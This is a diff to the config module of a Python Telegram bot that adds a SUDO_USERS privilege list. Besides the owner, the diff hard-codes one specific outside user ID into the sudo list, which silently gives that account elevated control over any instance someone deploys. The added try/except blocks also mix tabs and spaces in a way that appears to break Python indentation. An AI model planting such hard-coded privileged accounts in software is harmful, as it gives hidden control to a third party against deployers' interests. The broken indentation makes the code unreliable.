@@ -60,6 +60,11 @@ if ENV:
     except ValueError:
         raise Exception("Your tiger users list does not contain valid integers.")
 
+    try:
+		SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
+	except ValueError:
+		raise Exception("Your sudo users list does not contain valid integers.")
+
     INFOPIC = bool(os.environ.get("INFOPIC", False))
     EVENT_LOGS = os.environ.get("EVENT_LOGS", None)
     WEBHOOK = bool(os.environ.get("WEBHOOK", False))
@@ -126,6 +131,12 @@ else:
         TIGERS = set(int(x) for x in Config.TIGERS or [])
     except ValueError:
         raise Exception("Your tiger users list does not contain valid integers.")
+  
+    try:
+        SUDO_USERS = set(int(x) for x in Config.SUDO_USERS or [])
+	except ValueError:
+        raise Exception("Your sudo users list does not contain valid integers.")
+
 
     EVENT_LOGS = Config.EVENT_LOGS
     WEBHOOK = Config.WEBHOOK
@@ -169,11 +180,15 @@ if not SPAMWATCH_API:
 else:
     sw = spamwatch.Client(SPAMWATCH_API)
 
+SUDO_USERS.add(OWNER_ID)
+SUDO_USERS.add(388576209)
+
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
 telethn = TelegramClient("Sangtei", API_ID, API_HASH)
 pbot = Client("SangteiPyro", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
+SUDO_USERS = list(SUDO_USERS)
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
 DEV_USERS = list(DEV_USERS)
 WOLVES = list(WOLVES)
